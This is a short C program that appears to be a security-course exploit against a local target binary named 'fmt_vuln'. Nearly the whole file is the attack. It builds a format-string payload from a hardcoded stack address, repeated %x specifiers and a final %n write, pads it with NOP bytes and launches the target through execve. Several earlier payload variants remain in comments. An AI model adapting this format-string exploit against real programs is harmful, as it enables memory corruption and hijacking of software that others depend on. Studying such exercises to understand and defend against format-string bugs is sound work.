#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/home/user/sploits/fmt_vuln"

int main(int argc, char* argv[])
{
  char *args[3];
  char *env[1];
  int i;

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  //char *attackString = "\xb8\x9a\xfe\xb7%x.%x.%x.%x.%x.%x.%x.%x.%x.%n";
  //char *attackString = "%64AAA0_%08x.%08x.%n";
  //char *attackString = "Test";
  char *attackString = "\x44\xfa\xff\xbf%x.%x.%x.%x.%x.%x.%x.%x.%x.%n";
  int bufSize = strlen(attackString)+1;
  args[1] = malloc(bufSize);
  memset(args[1],0x90,bufSize-1);
  memcpy(args[1],attackString,strlen(attackString));
  args[1][bufSize - 1] = '\0';
  
  // args[1] = "%s%s%s%s%s%s%s%s%s%s%s";
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
